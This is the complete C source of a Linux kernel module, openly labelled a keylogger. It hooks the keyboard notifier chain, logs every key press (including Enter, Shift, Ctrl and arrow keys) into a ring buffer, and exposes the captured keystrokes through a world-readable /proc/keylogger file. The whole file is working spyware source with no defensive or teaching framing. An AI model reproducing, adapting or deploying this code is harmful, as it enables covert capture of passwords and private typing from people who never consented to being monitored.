#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/keyboard.h>
#include <linux/proc_fs.h>
#include <linux/fs.h>
#include <linux/uaccess.h>
#include <linux/spinlock.h>
#include <linux/input.h>

#define PROC_NAME "keylogger"
#define BUFFER_SIZE 1024

static char key_buffer[BUFFER_SIZE];
static int buf_head = 0;
static int buf_tail = 0;
static spinlock_t buffer_lock;
static struct proc_dir_entry *proc_file;

static void buffer_add(char key)
{
    unsigned long flags;
    spin_lock_irqsave(&buffer_lock, flags);

    key_buffer[buf_head] = key;
    buf_head = (buf_head + 1) % BUFFER_SIZE;
    if (buf_head == buf_tail) {
        buf_tail = (buf_tail + 1) % BUFFER_SIZE;
    }
    
    spin_unlock_irqrestore(&buffer_lock, flags);
}

static void buffer_add_string(const char *str)
{
    unsigned long flags;
    spin_lock_irqsave(&buffer_lock, flags);
    
    while (*str) {
        key_buffer[buf_head] = *str;
        buf_head = (buf_head + 1) % BUFFER_SIZE;
        if (buf_head == buf_tail) {
            buf_tail = (buf_tail + 1) % BUFFER_SIZE;
        }
        str++;
    }
    
    spin_unlock_irqrestore(&buffer_lock, flags);
}

static const char us_keymap[] = {
    0, 0, '1', '2', '3', '4', '5', '6', '7', '8', '9', '0', '-', '=', 0,
    0, 'q', 'w', 'e', 'r', 't', 'y', 'u', 'i', 'o', 'p', '[', ']', 0,
    0, 'a', 's', 'd', 'f', 'g', 'h', 'j', 'k', 'l', ';', '\'', '`',
    0, '\\', 'z', 'x', 'c', 'v', 'b', 'n', 'm', ',', '.', '/', 0,
    '*', 0, ' ', 0, 0, 0, 0, 0, 0, 0, 0, 0, 0,
};

static int keys_callback(struct notifier_block *nblock, unsigned long code, void *_param)
{
    struct keyboard_notifier_param *param = _param;

    if (code == KBD_KEYCODE && param->down) {
        unsigned int val = param->value;

        switch (val) {
            case KEY_BACKSPACE: 
                buffer_add_string("[BKSP]"); 
                return NOTIFY_OK;
            case KEY_TAB: 
                buffer_add_string("[TAB]"); 
                return NOTIFY_OK;
            case KEY_ENTER: 
                buffer_add_string("[ENTER]"); 
                return NOTIFY_OK;
            case KEY_CAPSLOCK:
                buffer_add_string("[CAPS]");
                return NOTIFY_OK;
            case KEY_ESC:
                buffer_add_string("[ESC]");
                return NOTIFY_OK;
            case KEY_LEFTSHIFT:
            case KEY_RIGHTSHIFT:
                buffer_add_string("[SHIFT]");
                return NOTIFY_OK;
            case KEY_LEFTCTRL:
            case KEY_RIGHTCTRL:
                buffer_add_string("[CTRL]");
                return NOTIFY_OK;
            case KEY_LEFT:
                buffer_add_string("[LEFT]");
                return NOTIFY_OK;
            case KEY_RIGHT:
                buffer_add_string("[RIGHT]");
                return NOTIFY_OK;
            case KEY_DOWN:
                buffer_add_string("[DOWN]");
                return NOTIFY_OK;
            case KEY_UP:
                buffer_add_string("[UP]");
                return NOTIFY_OK;
        }

        if (val < sizeof(us_keymap) / sizeof(char)) {
            char ch = us_keymap[val];
            if (ch != 0) {
                buffer_add(ch);
            }
        }
    }
    return NOTIFY_OK;
}

static struct notifier_block keys_nb = {
    .notifier_call = keys_callback,
};

static ssize_t keylogger_read(struct file *f, char __user *buf, size_t len, loff_t *offset)
{
    unsigned long flags;
    int temp_idx = 0;
    char temp_buffer[BUFFER_SIZE];

    if (*offset > 0) return 0;
    spin_lock_irqsave(&buffer_lock, flags);
    
    while (buf_tail != buf_head) {
        temp_buffer[temp_idx++] = key_buffer[buf_tail];
        buf_tail = (buf_tail + 1) % BUFFER_SIZE;
    }
    
    spin_unlock_irqrestore(&buffer_lock, flags);

    if (temp_idx == 0) return 0;
    if (len < temp_idx) temp_idx = len;
    if (copy_to_user(buf, temp_buffer, temp_idx)) {
        return -EFAULT;
    }
    *offset = temp_idx; 
    
    return temp_idx;
}

static const struct proc_ops proc_ops = {
    .proc_read = keylogger_read,
};

static int __init proc_module_init(void)
{
    spin_lock_init(&buffer_lock);
    register_keyboard_notifier(&keys_nb);
    proc_file = proc_create(PROC_NAME, 0444, NULL, &proc_ops);
    if (!proc_file) {
        printk(KERN_ERR "keylogger: failed to create /proc/%s\n", PROC_NAME);
        unregister_keyboard_notifier(&keys_nb);
        return -ENOMEM;
    }
    
    printk(KERN_INFO "keylogger: module loaded\n");
    return 0;
}

static void __exit proc_module_exit(void)
{
    unregister_keyboard_notifier(&keys_nb);
    if (proc_file) {
        proc_remove(proc_file);
    }
    printk(KERN_INFO "keylogger: module unloaded\n");
}

module_init(proc_module_init);
module_exit(proc_module_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Michael <srp981680@gmail.com>");
MODULE_DESCRIPTION("simple keylogger");
MODULE_VERSION("1.0");
